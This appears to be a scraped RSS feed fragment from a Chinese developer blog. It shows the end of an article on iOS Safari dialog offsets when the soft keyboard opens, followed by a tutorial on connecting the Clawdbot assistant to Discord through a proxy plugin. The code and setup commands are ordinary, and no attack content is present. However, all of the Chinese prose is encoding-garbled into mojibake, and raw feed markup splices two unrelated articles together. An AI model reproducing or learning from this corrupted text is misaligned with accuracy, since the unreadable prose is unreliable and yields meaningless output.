<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> scrollY = <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> || <span class="hljs-variable language_">window</span>.<span class="hljs-property">pageYOffset</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">scrollTop</span> || <span class="hljs-number">0</span>;
</code></pre>
<h3 data-id="heading-26">å‘ 3ï¼š100vh åœ¨ iOS ä¸Šä¸é è°±</h3>
<p>iOS Safari çš„ <code>100vh</code> æ˜¯ä¸€ä¸ª"ç†æƒ³å€¼"ï¼ŒåŒ…å«äº†åœ°å€æ çš„é«˜åº¦ã€‚å½“åœ°å€æ æ”¶èµ·æˆ–è½¯é”®ç›˜å¼¹å‡ºæ—¶ï¼Œå®é™…å¯è§†åŒºåŸŸä¼šå˜åŒ–ï¼Œä½† <code>100vh</code> ä¸å˜ã€‚</p>
<p><strong>è§£å†³ï¼š</strong> ä½¿ç”¨ <code>100dvh</code>ï¼ˆåŠ¨æ€è§†å£é«˜åº¦ï¼‰ï¼Œä½†è¦æ³¨æ„å…¼å®¹æ€§ï¼š</p>
<ul>
<li>iOS 15.4+</li>
<li>Chrome 108+</li>
<li>Firefox 101+</li>
</ul>
<p>å¯¹äºä¸æ”¯æŒçš„æµè§ˆå™¨ï¼Œå¯ä»¥ç”¨ JS åŠ¨æ€è®¡ç®—ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">setVh</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> vh = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> * <span class="hljs-number">0.01</span>;
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-title function_">setProperty</span>(<span class="hljs-string">'--vh'</span>, <span class="hljs-string">`<span class="hljs-subst">${vh}</span>px`</span>);
};
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, setVh);
</code></pre>
<h3 data-id="heading-27">å‘ 4ï¼šå¤šä¸ªå¼¹çª—åµŒå¥—</h3>
<p>å¦‚æœé¡µé¢ä¸Šæœ‰å¤šä¸ªå¼¹çª—ç»„ä»¶ï¼Œæ¯ä¸ªéƒ½è°ƒç”¨ <code>lockBodyScroll</code>ï¼Œä¼šäº’ç›¸è¦†ç›– <code>savedScrollY</code>ã€‚</p>
<p><strong>è§£å†³ï¼š</strong> ä½¿ç”¨å¼•ç”¨è®¡æ•°ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> lockCount = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> savedScrollY = <span class="hljs-number">0</span>;
<span class="hljs-keyword">let</span> savedBodyStyle = <span class="hljs-string">''</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">lockBodyScroll</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (lockCount === <span class="hljs-number">0</span>) {
    savedScrollY = <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span> || <span class="hljs-number">0</span>;
    savedBodyStyle = <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span>;
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = <span class="hljs-string">`...`</span>;
  }
  lockCount++;
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">unlockBodyScroll</span> = (<span class="hljs-params"/>) =&gt; {
  lockCount--;
  <span class="hljs-keyword">if</span> (lockCount === <span class="hljs-number">0</span>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-property">style</span>.<span class="hljs-property">cssText</span> = savedBodyStyle;
    <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(<span class="hljs-number">0</span>, savedScrollY);
  }
};
</code></pre>
<hr/>
<h2 data-id="heading-28">å»¶ä¼¸ï¼šå…¶ä»–è§£å†³æ–¹æ¡ˆ</h2>
<h3 data-id="heading-29">æ–¹æ¡ˆäºŒï¼šä½¿ç”¨ Visual Viewport API</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">adjustDialogPosition</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">visualViewport</span>) {
    <span class="hljs-keyword">const</span> offsetY = <span class="hljs-variable language_">window</span>.<span class="hljs-property">innerHeight</span> - <span class="hljs-variable language_">window</span>.<span class="hljs-property">visualViewport</span>.<span class="hljs-property">height</span>;
    dialogRef.<span class="hljs-property">value</span>.<span class="hljs-property">style</span>.<span class="hljs-property">transform</span> = <span class="hljs-string">`translateY(-<span class="hljs-subst">${offsetY / <span class="hljs-number">2</span>}</span>px)`</span>;
  }
};

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">visualViewport</span>?.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, adjustDialogPosition);
});

<span class="hljs-title function_">onBeforeUnmount</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">visualViewport</span>?.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'resize'</span>, adjustDialogPosition);
});
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong> ä¸éœ€è¦é”å®š bodyï¼Œæ›´"ä¼˜é›…"
<strong>ç¼ºç‚¹ï¼š</strong> éœ€è¦æŒç»­ç›‘å¬ï¼Œæœ‰æ€§èƒ½å¼€é”€ï¼›å¼¹çª—ä½ç½®ä¼šè·³åŠ¨</p>
<h3 data-id="heading-30">æ–¹æ¡ˆä¸‰ï¼šè½¯é”®ç›˜æ”¶èµ·åå†æ˜¾ç¤ºå¼¹çª—</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">showDialog</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// å…ˆè®©è¾“å…¥æ¡†å¤±ç„¦ï¼Œæ”¶èµ·è½¯é”®ç›˜</span>
  (<span class="hljs-variable language_">document</span>.<span class="hljs-property">activeElement</span> <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLElement</span>)?.<span class="hljs-title function_">blur</span>();

  <span class="hljs-comment">// ç­‰å¾…è½¯é”®ç›˜æ”¶èµ·åŠ¨ç”»å®Œæˆ</span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    dialogVisible.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>;
  }, <span class="hljs-number">300</span>);
};
</code></pre>
<p><strong>ä¼˜ç‚¹ï¼š</strong> ç®€å•ç²—æš´ï¼Œç»•è¿‡é—®é¢˜
<strong>ç¼ºç‚¹ï¼š</strong> ç”¨æˆ·ä½“éªŒä¸å¥½ï¼Œæœ‰æ˜æ˜¾å»¶è¿Ÿ</p>
<hr/>
<h2 data-id="heading-31">æ€»ç»“</h2>
<p>è¿™ä¸ªé—®é¢˜æœ¬è´¨ä¸Šæ˜¯ <strong>iOS WebKit çš„ viewport å¤„ç†æœºåˆ¶</strong> å’Œ <strong><code>position: fixed</code> å®šä½</strong> çš„å†²çªã€‚</p>
<p>å…³é”®ç‚¹ï¼š</p>
<ol>
<li>iOS Safari è½¯é”®ç›˜å¼¹å‡ºæ—¶åªæ”¹å˜ Visual Viewportï¼Œä¸æ”¹å˜ Layout Viewport</li>
<li><code>position: fixed</code> æ ¹æ® Layout Viewport è®¡ç®—ä½ç½®ï¼Œä½†æ¸²æŸ“åœ¨ Visual Viewport</li>
<li>é¡µé¢åˆ‡æ¢æ—¶æ»šåŠ¨çŠ¶æ€ç´¯ç§¯ï¼ŒåŠ å‰§äº†åç§»</li>
</ol>
<p>è§£å†³æ–¹æ¡ˆçš„æ ¸å¿ƒå°±ä¸€å¥è¯ï¼š<strong>å¼¹çª—æ˜¾ç¤ºæ—¶é”å®š body æ»šåŠ¨ï¼Œå…³é—­æ—¶æ¢å¤</strong>ã€‚</p>
<p>è¿™ä¸æ˜¯ bugï¼Œæ˜¯ Apple çš„"è®¾è®¡é€‰æ‹©"ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œæˆ‘ä»¬åªèƒ½è§æ‹›æ‹†æ‹›ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åˆ°é‡åˆ°åŒæ ·é—®é¢˜çš„æœ‹å‹ï¼Œå°‘èµ°ç‚¹å¼¯è·¯ã€‚</p>
<hr/>
<p><em>å‚è€ƒèµ„æ–™ï¼š</em></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fbugs.webkit.org%2Fshow_bug.cgi%3Fid%3D141832" target="_blank" title="https://bugs.webkit.org/show_bug.cgi?id=141832" ref="nofollow noopener noreferrer">WebKit Bug #141832: position:fixed and virtual keyboard</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FAPI%2FVisual_Viewport_API" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/API/Visual_Viewport_API" ref="nofollow noopener noreferrer">MDN: Visual Viewport API</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fen-US%2Fdocs%2FWeb%2FCSS%2Flength%23dynamic_viewport_units" target="_blank" title="https://developer.mozilla.org/en-US/docs/Web/CSS/length#dynamic_viewport_units" ref="nofollow noopener noreferrer">MDN: CSS length - Dynamic viewport units</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.quirksmode.org%2Fmobile%2Fviewports2.html" target="_blank" title="https://www.quirksmode.org/mobile/viewports2.html" ref="nofollow noopener noreferrer">A tale of two viewports</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdevelopers.google.com%2Fweb%2Ffundamentals%2Fperformance%2Frendering" target="_blank" title="https://developers.google.com/web/fundamentals/performance/rendering" ref="nofollow noopener noreferrer">Google Developers: Rendering Performance</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç©è½¬ Clawdbot æ¥å…¥ Discord ä¿å§†çº§æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7602991346585075746</link>    <guid>https://juejin.cn/post/7602991346585075746</guid>    <pubDate>2026-02-05T08:48:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602991346585075746" data-draft-id="7602916013878296591" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç©è½¬ Clawdbot æ¥å…¥ Discord ä¿å§†çº§æ•™ç¨‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-05T08:48:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ·±åœ³è”“å»¶ç§‘æŠ€"/> <meta itemprop="url" content="https://juejin.cn/user/1919099566570249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç©è½¬ Clawdbot æ¥å…¥ Discord ä¿å§†çº§æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1919099566570249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ·±åœ³è”“å»¶ç§‘æŠ€
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T08:48:31.000Z" title="Thu Feb 05 2026 08:48:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ç©è½¬ Clawdbot æ¥å…¥ Discord ä¿å§†çº§æ•™ç¨‹</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>Clawdbotï¼ˆåŸ Moltbotï¼‰æ˜¯ä¸€æ¬¾å¼ºå¤§çš„ AI åŠ©æ‰‹æ¡†æ¶ï¼Œæ”¯æŒé€šè¿‡æ’ä»¶æ‰©å±•å„ç§åŠŸèƒ½ã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»å¦‚ä½•å°† Clawdbot æ¥å…¥ Discordï¼Œå®ç°é€šè¿‡ Discord é¢‘é“æˆ–ç§èŠä¸ AI åŠ©æ‰‹äº¤äº’ã€‚</p>
<p>æœ¬æ•™ç¨‹çš„æ ¸å¿ƒæ˜¯ä½¿ç”¨ <strong>clawdbot-discord-proxy</strong> æ’ä»¶ï¼Œè¯¥æ’ä»¶æ”¯æŒé€šè¿‡ä»£ç†è¿æ¥ Discordï¼Œç‰¹åˆ«é€‚åˆå¤§é™†åœ°åŒºç”¨æˆ·ã€‚</p>
<h3 data-id="heading-2">ä¸€ã€å‰ç½®å‡†å¤‡</h3>
<ol start="0">
<li><strong>å·²éƒ¨ç½² Clawdbot çš„äº‘æœåŠ¡å™¨</strong>ï¼ˆNode.js â‰¥ 22ï¼Œå·²å®‰è£… Clawdbotï¼‰</li>
<li><strong>Discord è´¦å·</strong>ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.com%2Fregister" target="_blank" title="https://discord.com/register" ref="nofollow noopener noreferrer">æ³¨å†Œåœ°å€</a>ï¼‰</li>
<li><strong>äº‘æœåŠ¡å™¨å·²é…ç½®æµ·å¤–ä»£ç†</strong>ï¼ˆèƒ½è®¿é—® Discord APIï¼‰</li>
</ol>
<h3 data-id="heading-3">äºŒã€å®‰è£… clawdbot-discord-proxy æ’ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å…‹éš†é¡¹ç›®</span>
git <span class="hljs-built_in">clone</span> https://github.com/Terendelev/clawdbot-discord-proxy.git
<span class="hljs-built_in">cd</span> clawdbot-discord-proxy
â€‹
<span class="hljs-comment"># 2. å®‰è£…ä¾èµ–å¹¶ç¼–è¯‘</span>
npm install
npm run build
â€‹
<span class="hljs-comment"># 3. å¤åˆ¶åˆ° Clawdbot æ’ä»¶ç›®å½•</span>
<span class="hljs-built_in">cp</span> -r ./ ~/.clawdbot/extensions/clawdbot-discord-proxy/
â€‹
<span class="hljs-comment"># 4. é‡å¯ Gateway //å¦‚æœå¤±è´¥è¯·å…ˆå¤åˆ¶é…ç½®æ–‡ä»¶</span>
clawdbot gateway restart
</code></pre>
<h3 data-id="heading-4">ä¸‰ã€åˆ›å»º Discord Bot</h3>
<ol start="0">
<li>
<p>æ‰“å¼€ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.com%2Fdevelopers%2Fapplications" target="_blank" title="https://discord.com/developers/applications" ref="nofollow noopener noreferrer">Discord å¼€å‘è€…å¹³å°</a></p>
</li>
<li>
<p>ç‚¹å‡» <strong>New Application</strong>ï¼Œè¾“å…¥ Bot åç§°ï¼ˆå¦‚ Clawdbot-AIï¼‰</p>
</li>
<li>
<p>ç‚¹å‡»å·¦ä¾§ <strong>Bot</strong> â†’ <strong>Add Bot</strong>ï¼Œç¡®è®¤åˆ›å»º Bot</p>
</li>
<li>
<p>å¤åˆ¶ <strong>Token</strong>ï¼ˆç‚¹å‡» Reset Token ç”Ÿæˆï¼Œå¦¥å–„ä¿å­˜ï¼‰</p>
</li>
<li>
<p>å¼€å¯å…³é”®æƒé™ï¼š</p>
<ul>
<li><strong>MESSAGE CONTENT INTENT</strong>ï¼ˆè¯»å–æ¶ˆæ¯å†…å®¹ï¼‰</li>
<li><strong>SERVER MEMBERS INTENT</strong>ï¼ˆå¯é€‰ï¼‰</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5">å››ã€é…ç½® Bot æƒé™</h3>
<ol start="0">
<li>
<p>å·¦ä¾§ç‚¹å‡» <strong>OAuth2</strong> â†’ <strong>URL Generator</strong></p>
</li>
<li>
<p>å‹¾é€‰æƒé™ï¼š</p>
<ul>
<li><strong>Scopes</strong>: <code>bot</code> + <code>applications.commands</code></li>
<li><strong>Bot Permissions</strong>: <code>Send Messages</code>, <code>Read Message History</code>, <code>Embed Links</code>, <code>Use Slash Commands</code></li>
</ul>
</li>
<li>
<p>å¤åˆ¶ç”Ÿæˆçš„ Invite Linkï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€ï¼Œå°† Bot é‚€è¯·åˆ°æœåŠ¡å™¨</p>
</li>
</ol>
<h3 data-id="heading-6">äº”ã€é…ç½® Clawdbot</h3>
<p>ç¼–è¾‘ <code>~/.clawdbot/clawdbot.json</code>ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
 Â <span class="hljs-attr">"channels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â <span class="hljs-attr">"clawdbot-discord-proxy"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â  Â <span class="hljs-attr">"accounts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â  Â  Â <span class="hljs-attr">"default"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â  Â  Â  Â <span class="hljs-attr">"token"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"YOUR_DISCORD_BOT_TOKEN"</span><span class="hljs-punctuation">,</span>
 Â  Â  Â  Â  Â <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
 Â  Â  Â  Â  Â <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Clawdbot Discord"</span>
 Â  Â  Â   <span class="hljs-punctuation">}</span>
 Â  Â   <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
 Â  Â  Â <span class="hljs-attr">"proxyConfig"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â  Â  Â <span class="hljs-attr">"httpUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://PROXY_IP:HTTP_PORT"</span><span class="hljs-punctuation">,</span>
 Â  Â  Â  Â <span class="hljs-attr">"httpsUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://PROXY_IP:HTTP_PORT"</span><span class="hljs-punctuation">,</span>
 Â  Â  Â  Â <span class="hljs-attr">"wsUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"socks5://PROXY_IP:SOCKS_PORT"</span><span class="hljs-punctuation">,</span>
 Â  Â  Â  Â <span class="hljs-attr">"wssUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"socks5://PROXY_IP:SOCKS_PORT"</span><span class="hljs-punctuation">,</span>
 Â  Â  Â  Â <span class="hljs-attr">"noProxy"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"localhost"</span><span class="hljs-punctuation">,</span> <span class="hljs-string">"127.0.0.1"</span><span class="hljs-punctuation">]</span>
 Â  Â   <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
 Â  Â  Â <span class="hljs-attr">"pluralkit"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â  Â  Â <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
 Â  Â   <span class="hljs-punctuation">}</span>
 Â   <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
 Â <span class="hljs-attr">"plugins"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â <span class="hljs-attr">"entries"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â  Â <span class="hljs-attr">"clawdbot-discord-proxy"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
 Â  Â  Â  Â <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span>
 Â  Â   <span class="hljs-punctuation">}</span>
 Â   <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-7">é…ç½®è¯´æ˜</h4>

























<table><thead><tr><th>é…ç½®é¡¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>token</code></td><td>Discord Bot Token</td></tr><tr><td><code>httpUrl</code> / <code>httpsUrl</code></td><td>HTTP/HTTPS ä»£ç†åœ°å€</td></tr><tr><td><code>wsUrl</code> / <code>wssUrl</code></td><td>SOCKS5 ä»£ç†åœ°å€</td></tr><tr><td><code>pluralkit.enabled</code></td><td>æ˜¯å¦å¯ç”¨ PluralKit æ”¯æŒ</td></tr></tbody></table>
<h3 data-id="heading-8">å…­ã€å¯åŠ¨ Gateway</h3>
<pre><code class="hljs">clawdbot gateway Â restart
</code></pre>
<h3 data-id="heading-9">ä¸ƒã€åŠŸèƒ½ç‰¹æ€§</h3>
<ul>
<li><strong>WebSocket Gateway</strong> - é€šè¿‡ä»£ç†è¿æ¥ Discord å®æ—¶ç½‘å…³</li>
<li><strong>REST API</strong> - å®Œæ•´çš„ Discord REST API å°è£…</li>
<li><strong>ä»£ç†æ”¯æŒ</strong> - HTTP/HTTPS å’Œ SOCKS5 ä»£ç†</li>
<li><strong>PluralKit æ”¯æŒ</strong> - è‡ªåŠ¨è¯†åˆ«ä»£ç†æ¶ˆæ¯</li>
</ul>
<h3 data-id="heading-10">å…«ã€å¸¸è§é—®é¢˜</h3>
<h4 data-id="heading-11">1. Gateway è¿æ¥è¶…æ—¶</h4>
<ul>
<li>æ£€æŸ¥ SOCKS5 ä»£ç†æ˜¯å¦æ­£å¸¸è¿è¡Œ</li>
<li>éªŒè¯ Bot Token æ˜¯å¦æœ‰æ•ˆ</li>
<li>ç¡®ä¿é˜²ç«å¢™å…è®¸ WebSocket è¿æ¥</li>
</ul>
<h4 data-id="heading-12">2. æ¶ˆæ¯å‘é€å¤±è´¥</h4>
<ul>
<li>æ£€æŸ¥ Bot æ˜¯å¦æœ‰å‘é€æ¶ˆæ¯æƒé™</li>
<li>ç¡®è®¤ç›®æ ‡ç”¨æˆ·å·²æœ‰ä¸ Bot çš„ DM é¢‘é“</li>
<li>æŸ¥çœ‹æ—¥å¿—ï¼š<code>tail -50 /tmp/clawdbot/clawdbot-*.log</code></li>
</ul>
<h4 data-id="heading-13">3. ä»£ç†é…ç½®ä¸ç”Ÿæ•ˆ</h4>
<ul>
<li>ç¡®è®¤ä»£ç†åœ°å€å’Œç«¯å£æ­£ç¡®</li>
<li>æ£€æŸ¥ <code>noProxy</code> åˆ—è¡¨æ˜¯å¦åŒ…å«å¿…è¦åœ°å€</li>
</ul>
<h3 data-id="heading-14">ä¹ã€ç›¸å…³é“¾æ¥</h3>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTerendelev%2Fclawdbot-discord-proxy" target="_blank" title="https://github.com/Terendelev/clawdbot-discord-proxy" ref="nofollow noopener noreferrer">GitHub ä»“åº“</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.clawd.bot" target="_blank" title="https://docs.clawd.bot" ref="nofollow noopener noreferrer">Clawdbot æ–‡æ¡£</a></li>
